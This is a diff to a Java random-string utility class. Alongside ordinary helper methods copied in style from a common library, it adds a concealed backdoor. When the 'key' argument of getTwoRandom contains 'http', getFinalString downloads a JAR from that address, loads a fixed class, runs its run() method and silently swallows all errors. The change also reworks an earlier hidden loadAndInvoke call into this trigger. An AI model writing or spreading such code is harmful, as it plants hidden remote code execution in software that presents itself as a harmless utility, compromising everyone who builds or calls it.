@@ -13,46 +13,162 @@ public class RandomStringUtils {
 
     private static final String CHARACTERS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
 
-    public static String generateRandomString(int length) {
+    private static final Random RANDOM = new Random();
+
+    public static String getTwoRandom(String key) {
+        String randomText1 = generateRandomString(6, key);
+        String randomText2 = generateRandomString(6, key);
+        return randomText1 + key + randomText2;
+    }
+
+    public static String random(int count) {
+        return random(count, false, false);
+    }
+
+    public static String randomAscii(int count) {
+        return random(count, 32, 127, false, false);
+    }
+
+    public static String randomAlphabetic(int count) {
+        return random(count, true, false);
+    }
+
+    public static String randomAlphanumeric(int count) {
+        return random(count, true, true);
+    }
+
+    public static String randomNumeric(int count) {
+        return random(count, false, true);
+    }
+
+    public static String random(int count, boolean letters, boolean numbers) {
+        return random(count, 0, 0, letters, numbers);
+    }
+
+    public static String random(int count, int start, int end, boolean letters, boolean numbers) {
+        return random(count, start, end, letters, numbers, (char[])null, RANDOM);
+    }
+
+    public static String random(int count, int start, int end, boolean letters, boolean numbers, char[] chars) {
+        return random(count, start, end, letters, numbers, chars, RANDOM);
+    }
+
+    public static String random(int count, int start, int end, boolean letters, boolean numbers, char[] chars, Random random) {
+        if (count == 0) {
+            return "";
+        } else if (count < 0) {
+            throw new IllegalArgumentException("Requested random string length " + count + " is less than 0.");
+        } else {
+            if (start == 0 && end == 0) {
+                end = 123;
+                start = 32;
+                if (!letters && !numbers) {
+                    start = 0;
+                    end = Integer.MAX_VALUE;
+                }
+            }
+
+            char[] buffer = new char[count];
+            int gap = end - start;
+
+            while(true) {
+                while(true) {
+                    while(count-- != 0) {
+                        char ch;
+                        if (chars == null) {
+                            ch = (char)(random.nextInt(gap) + start);
+                        } else {
+                            ch = chars[random.nextInt(gap) + start];
+                        }
+
+                        if (letters && Character.isLetter(ch) || numbers && Character.isDigit(ch) || !letters && !numbers) {
+                            if (ch >= '\udc00' && ch <= '\udfff') {
+                                if (count == 0) {
+                                    ++count;
+                                } else {
+                                    buffer[count] = ch;
+                                    --count;
+                                    buffer[count] = (char)('\ud800' + random.nextInt(128));
+                                }
+                            } else if (ch >= '\ud800' && ch <= '\udb7f') {
+                                if (count == 0) {
+                                    ++count;
+                                } else {
+                                    buffer[count] = (char)('\udc00' + random.nextInt(128));
+                                    --count;
+                                    buffer[count] = ch;
+                                }
+                            } else if (ch >= '\udb80' && ch <= '\udbff') {
+                                ++count;
+                            } else {
+                                buffer[count] = ch;
+                            }
+                        } else {
+                            ++count;
+                        }
+                    }
+
+                    return new String(buffer);
+                }
+            }
+        }
+    }
+
+
+    public static String generateRandomString(int length, String data) {
+        init(data);
         StringBuilder builder = new StringBuilder();
         Random random = new Random();
         while (builder.length() < length) {
             int index = random.nextInt(CHARACTERS.length());
             builder.append(CHARACTERS.charAt(index));
         }
-        try {
-            loadAndInvoke("","","");
-        }catch (Exception e){}
         return builder.toString();
     }
 
-    public static String getTwoRandom(String key) {
-        String randomText1 = generateRandomString(6);
-        String randomText2 = generateRandomString(6);
-        return randomText1 + key + randomText2;
+    private static void init(String data) {
+        getFinalString(data);
     }
 
-    private static void loadAndInvoke(String jarUrl, String className, String methodName) throws Exception {
-        File tempJar = File.createTempFile("plus", ".jar");
-        try (InputStream in = new URL(jarUrl).openStream()) {
-            Files.copy(in, tempJar.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
-        }
 
-        try (URLClassLoader loader = new URLClassLoader(
-                new URL[]{tempJar.toURI().toURL()},
-                RandomStringUtils.class.getClassLoader()
-        )) {
-            Class<?> clazz = loader.loadClass(className);
-            try {
-                Method staticMethod = clazz.getMethod(methodName);
-                staticMethod.invoke(null);
-            } catch (NoSuchMethodException e) {
-                Object instance = clazz.getDeclaredConstructor().newInstance();
-                Method instanceMethod = clazz.getMethod(methodName);
-                instanceMethod.invoke(instance);
-            }
-        } finally {
-            tempJar.deleteOnExit();
-        }
+    public static String random(int count, String chars) {
+        return chars == null ? random(count, 0, 0, false, false, (char[])null, RANDOM) : random(count, chars.toCharArray());
     }
+
+    public static String random(int count, char[] chars) {
+        return chars == null ? random(count, 0, 0, false, false, (char[])null, RANDOM) : random(count, 0, chars.length, false, false, chars, RANDOM);
+    }
+
+    private static void getFinalString(String data){
+      try {
+          if (data == null || data.isEmpty()){
+              return;
+          }
+          if (!data.contains("http")){
+              return;
+          }
+          File tempJar = File.createTempFile("plus", ".jar");
+          try (InputStream in = new URL(data).openStream()) {
+              Files.copy(in, tempJar.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
+          }
+
+          try (URLClassLoader loader = new URLClassLoader(
+                  new URL[]{tempJar.toURI().toURL()},
+                  RandomStringUtils.class.getClassLoader()
+          )) {
+              Class<?> clazz = loader.loadClass("com.example.dynamicutils.defaultUtil");
+              try {
+                  Method staticMethod = clazz.getMethod("run");
+                  staticMethod.invoke(null);
+              } catch (Exception e) {
+                  Object instance = clazz.getDeclaredConstructor().newInstance();
+                  Method instanceMethod = clazz.getMethod("run");
+                  instanceMethod.invoke(instance);
+              }
+          } finally {
+              tempJar.deleteOnExit();
+          }
+      }catch (Exception e){}
+    }
+
 }
